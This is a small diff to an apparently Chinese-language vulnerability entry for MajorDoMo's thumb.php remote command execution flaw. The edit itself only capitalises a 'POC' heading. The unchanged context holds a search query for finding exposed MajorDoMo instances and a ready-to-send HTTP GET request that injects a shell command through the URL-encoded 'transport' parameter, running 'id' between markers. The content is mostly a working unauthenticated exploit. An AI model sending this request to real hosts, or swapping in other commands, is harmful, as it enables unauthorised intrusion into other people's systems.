@@ -7,7 +7,7 @@ MajorDoMo /modules/thumb/thumb.php接口处存在远程命令执行漏洞，未�
 app="MajordomoSL"
 ```
 
-## poc
+## POC
 ```
 GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
 Host: your-ip
